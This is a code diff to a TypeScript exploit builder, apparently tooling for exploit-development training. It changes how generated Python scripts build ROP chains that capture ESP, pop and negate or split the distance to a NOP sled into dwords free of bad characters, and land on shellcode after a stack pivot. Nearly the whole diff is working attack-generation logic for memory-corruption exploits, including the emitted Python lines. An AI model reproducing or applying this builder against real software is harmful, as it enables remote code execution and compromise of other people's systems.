@@ -577,20 +577,35 @@ export function buildExploit(input: BuildInput): Build {
         && usable(gadget, keep, [register]);
     })))[0];
 
-  /** `register += the distance to the shellcode`, where the script chooses the dword once the chain is
-   * laid out. The sled is a few hundred bytes up the stack, so the distance itself is 0x000001xx and a
-   * target with 00 among its bad chars cannot send it; what it can send is neg(distance), 0xFFFFFExx. A
-   * sub consumes that one as it is, and an add consumes it after a negate of the same register, so the
-   * sign the script sends is this choice and `negated` is what [7/7]'s to_sled then returns. */
-  const sledOps = (register: string, keep: string[]): { ops: Op[]; negated: boolean } | undefined => {
+  /** `register += the distance to the shellcode`, where the script chooses the dwords once the chain is
+   * laid out. `base` is the Python for the payload offset `register` holds the address of. The sled is a
+   * few hundred bytes up the stack, so the distance itself is 0x000001xx and a target with 00 among its
+   * bad chars cannot send it; what it can send is neg(distance), 0xFFFFFExx. A sub consumes that one as
+   * it is and an add consumes it after a negate of the same register. With neither, the distance goes in
+   * as two dwords the script picks clean, each popped and added in turn. `negated` is the sign [7/7]'s
+   * to_sled returns. */
+  type Sled = { ops: Op[]; negated: boolean; how: string; rank: number };
+  // The register a route works the distance out in, by its cheapest shape first and then by order.
+  const cheapest = <T extends { sled: Sled }>(found: Array<T | undefined>): T | undefined =>
+    found.filter((route): route is T => route !== undefined).sort((a, b) => a.sled.rank - b.sled.rank)[0];
+  const sledOps = (register: string, keep: string[], base: string): Sled | undefined => {
     const math = arithmetic(register, keep);
     if (!math) return undefined;
-    const sendable = (negated: boolean): boolean => negated || badchars.indexOf(0) < 0;
+    const at = "len(c) + 1 + c.skip // 4";
     const pop: Op = { call: math.pop, values: [computed("0")], note: `${math.by} = the distance to the NOPs, patched below` };
-    if (sendable(math.sub)) return { ops: [pop, { call: math.op, values: [] }], negated: math.sub };
+    const op: Op = { call: math.op, values: [] };
+    if (math.sub || badchars.indexOf(0) < 0) return { ops: [{ line: `c.patches.append(((${at},), ${base}, ${math.sub ? "True" : "False"}))` }, pop, op], negated: math.sub, how: `${math.sub ? "sub" : "add"} the distance`, rank: 0 };
     const flip = negateGadget(math.by, keep.concat(register));
-    if (!flip) return undefined;
-    return { ops: [pop, { call: entry(flip, `negate the distance`), values: [] }, { call: math.op, values: [] }], negated: !math.sub };
+    if (flip) {
+      return { ops: [{ line: `c.patches.append(((${at},), ${base}, True))` }, pop, { call: entry(flip, `negate the distance`), values: [] }, op], negated: true, how: "pop the distance negated, negate it and add it", rank: 1 };
+    }
+    const half: Op = { call: math.pop, values: [computed("0")], note: `${math.by} = one of two dwords that add up to the distance, patched below` };
+    return {
+      ops: [{ line: `part = ${at}` }, half, op, { line: `c.patches.append(((part, ${at}), ${base}, False))` }, half, op],
+      negated: false,
+      how: "add the distance as two dwords free of bad chars",
+      rank: 2,
+    };
   };
 
   // The ops that leave a slot's value in `register`. Both styles use this one loader.
@@ -641,64 +656,75 @@ export function buildExploit(input: BuildInput): Build {
         ];
       }
       case "shellcode": {
-        if (style === "staged") {
-          // A staged frame holds constants but for this one dword: the shellcode is in the payload, so
-          // its address is the captured ESP plus a distance only the laid-out chain knows. The capture
-          // runs inside this loader, because `here` has to name the chain dword ESP will be pointing at
-          // when it does, and the patched dword is the one popped straight after.
-          if (!capture) return missing(`no gadget captures ESP in ${input.module}: see [4/7]`);
+        // The captured ESP plus a distance only the laid-out chain knows. The capture runs inside this
+        // loader, because `here` has to name the chain dword ESP points at when it does. A staged frame has
+        // no other way to a stack address; the skeleton takes it when the field address cannot be copied
+        // out of its register without destroying it, which is how T10's reference does it.
+        const recapture = (): Op[] | undefined => {
+          if (!capture || writtenRegisters(capture.gadget).some((r) => keep.indexOf(r) >= 0)) return undefined;
           const from = capture.at.dest ?? "";
-          const route = [from, ...REGISTERS.filter((r) => r !== from && keep.indexOf(r) < 0)].map((at) => {
+          const route = cheapest([from, ...REGISTERS.filter((r) => r !== from && keep.indexOf(r) < 0)].map((at) => {
             const there = moveOps(from, at, keep);
-            const sled = there ? sledOps(at, keep) : undefined;
+            const sled = there ? sledOps(at, keep, "OFFSET + 4 * here") : undefined;
             const back = sled ? moveOps(at, register, keep) : undefined;
             return there && sled && back ? { there, sled, back } : undefined;
-          }).filter((found) => found !== undefined)[0];
-          if (!route) {
-            return missing(`no register takes the captured ESP out of ${from} and a distance onto it: the shellcode's address\n`
-              + `is ESP plus a few hundred bytes, so this needs an add or a sub whose distance the chain can send, and\n`
-              + `the chain can only send it negated while 00 is a bad char: dx @$osed().palette("${input.module}", "${badSpaced}")`);
-          }
-          sledSub = route.sled.negated;
-          say(register, slot.name, "the captured ESP plus a distance", `capture ESP, then ${route.sled.negated ? "sub" : "add"} the distance the script patches below`,
+          }));
+          if (!route) return undefined;
+          say(register, slot.name, "the captured ESP plus a distance", `capture ESP, then ${route.sled.how}, which the script patches below`,
             `the captured ESP plus the distance to the NOPs`);
           return [
             { line: `here = len(c) + 1 + c.skip // 4     # ${from} = the address of this chain dword` },
             { call: entry(capture.gadget, "capture ESP"), values: [] },
             ...route.there,
-            { line: "c.patches.append((len(c) + 1 + c.skip // 4, here))" },
             ...route.sled.ops,
             ...route.back,
           ];
+        };
+        const unreached = `no register takes the captured ESP out of ${capture?.at.dest ?? "a register"} and a distance onto it: the shellcode's address
+`
+          + `is ESP plus a few hundred bytes, so this needs an add or a sub of a register the chain can pop into: dx @$osed().palette("${input.module}", "${badSpaced}")`;
+        if (style === "staged") {
+          if (!capture) return missing(`no gadget captures ESP in ${input.module}: see [4/7]`);
+          return recapture() ?? missing(unreached);
         }
-        // The field address plus the distance to the sled, worked out in `register` itself or, when it has
-        // no sub, in any register that has one and can hand the result over.
-        const via = [register, ...REGISTERS.filter((r) => r !== register && keep.indexOf(r) < 0)].map((at) => {
-          const math = arithmetic(at, keep);
-          const there = math && (math.sub || badchars.indexOf(0) < 0) ? moveOps(field, at, keep) : undefined;
-          const back = there ? moveOps(at, register, keep) : undefined;
-          return math && there && back ? { math, there, back } : undefined;
-        }).filter((found) => found !== undefined)[0];
-        if (style === "skeleton" && via) {
-          sledSub = via.math.sub;
-          return [...via.there, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: via.math.pop, values: [computed("0")] }, { call: via.math.op, values: [] }, ...via.back];
+        if (style !== "skeleton") {
+          return missing(`the shellcode's address on the stack, so this dword needs a write before the pushad: bp ${pick("pushad") ? hex(gadgetAddress(pick("pushad")!.gadget)) : "<pushad gadget>"} ; g ; s -b esp L400${" 90".repeat(16)}`);
         }
-        const math = arithmetic(register, keep);
-        const move = moveOps(field, register, keep);
-        if (style !== "skeleton" || !math || !move) {
-          return missing(style === "skeleton" ? `no gadget adds a popped distance to ${register}`
-            : `the shellcode's address on the stack, so this dword needs a write before the pushad: bp ${pick("pushad") ? hex(gadgetAddress(pick("pushad")!.gadget)) : "<pushad gadget>"} ; g ; s -b esp L400${" 90".repeat(16)}`);
-        }
-        // The distance to the sled is a few hundred bytes, known only once the chain is laid out. Subtracted,
-        // it is popped as 0xFFFFFExx; added, as 0x000001xx, which no target with 00 as a bad char accepts.
-        if (!math.sub && badchars.indexOf(0) >= 0) return missing(`no sub into ${register}: the shellcode is a few hundred bytes up the stack, so an add would pop 00 bytes`);
-        return [...move, { line: "c.patches.append((len(c) + 1 + c.skip // 4, field))" }, { call: math.pop, values: [computed("0")] }, { call: math.op, values: [] }];
+        // The field address plus the distance to the sled, worked out in `register` itself or in any
+        // register that can take the distance and hand the result over.
+        const fieldBase = `FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex(writeOffset)}` : ""}`;
+        const via = cheapest([register, ...REGISTERS.filter((r) => r !== register && keep.indexOf(r) < 0)].map((at) => {
+          const there = moveOps(field, at, keep);
+          const sled = there ? sledOps(at, keep, fieldBase) : undefined;
+          const back = sled ? moveOps(at, register, keep) : undefined;
+          return there && sled && back ? { there, sled, back } : undefined;
+        }));
+        if (via) return [...via.there, ...via.sled.ops, ...via.back];
+        return recapture() ?? missing(`no gadget adds a popped distance to ${register} or to a register that can hand it over, either from the field address in ${field} or from a second capture of ESP`);
       }
     }
   };
 
-  // Whether the loaders subtract the distance to the sled or add it, which decides the sign to_sled pops.
-  let sledSub: boolean | undefined;
+  // Every patch names the dwords it fills, the payload offset its register held, and whether the chain
+  // negates what it pops. The gap grows until every patch has clean dwords, and a patch of two takes a
+  // pair that adds up to the distance, so a value no single dword can carry is still sent.
+  const SLED: Op[] = [
+    { line: "chain_end = OFFSET + 4 * len(c)" },
+    { line: "def to_sled(base, gap, negated):    # what the pops need, so the value lands on the NOPs" },
+    { line: "    distance = chain_end + gap - base" },
+    { line: "    return neg(distance) if negated else distance" },
+    { line: "def parts(v, n):                    # n dwords free of bad chars that add up to v" },
+    { line: "    if n == 1: return [v] if clean(v) else None" },
+    { line: "    for a in range(0x01010101, 0x100000000, 0x01010101):" },
+    { line: "        if clean(a) and clean(v - a): return [a, (v - a) & 0xFFFFFFFF]" },
+    { line: "gap = 0x40" },
+    { line: "while not all(parts(to_sled(b, gap, n), len(ats)) for ats, b, n in c.patches):" },
+    { line: "    gap += 1" },
+    { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
+    { line: "for ats, b, n in c.patches:" },
+    { line: "    words = parts(to_sled(b, gap, n), len(ats))" },
+    { line: "    for i in range(len(ats)): c[ats[i]] = words[i]" },
+  ];
   const loaders: Op[] = [];
   const defineLoader = (slot: Slot, register: string, keep: string[]): string => {
     const fn = `load_${ident(slot.name)}`;
@@ -797,19 +823,10 @@ export function buildExploit(input: BuildInput): Build {
         chain.push(...hole("pivot_value", why ?? `no way to move the field address into ${target}`));
       }
       chain.push({ call: entry(pivot.gadget, "pivot ESP onto field 1"), values: [] });
-      const sub = sledSub ?? arithmetic(valueRegister, [field])?.sub !== false;
       chain.push(
         { line: "" },
         group("the shellcode address, into the fields the loaders marked"),
-        { line: "chain_end = OFFSET + 4 * len(c)" },
-        { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` },
-        { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex(writeOffset)}` : ""})` },
-        { line: `    return ${sub ? "neg(distance)" : "distance"}` },
-        { line: "gap = 0x40" },
-        { line: "while not all(clean(to_sled(f, gap)) for _, f in c.patches):" },
-        { line: "    gap += 1" },
-        { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
-        { line: "for at, f in c.patches: c[at] = to_sled(f, gap)" },
+        ...SLED,
         { line: "" },
         { line: "payload  = PAD * FRAME_AT + frame + b\"\".join(p32(w) for w in c)" },
         { line: "payload += PAD * gap + nops + shellcode" },
@@ -872,14 +889,7 @@ export function buildExploit(input: BuildInput): Build {
       chain.push(
         { line: "" },
         group("the shellcode address, into the slot the loader marked"),
-        { line: `def to_sled(here, gap):        # what the pop before the ${sledSub ? "sub" : "add"} needs, so the value lands on the NOPs` },
-        { line: "    distance = 4 * (len(c) - here) + gap" },
-        { line: `    return ${sledSub ? "neg(distance)" : "distance"}` },
-        { line: "gap = 0x40" },
-        { line: "while not all(clean(to_sled(h, gap)) for _, h in c.patches):" },
-        { line: "    gap += 1" },
-        { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
-        { line: "for at, h in c.patches: c[at] = to_sled(h, gap)" },
+        ...SLED,
         { line: "" },
         { line: "payload  = PAD * OFFSET + b\"\".join(p32(w) for w in c)" },
         { line: "payload += PAD * gap + nops + shellcode" },
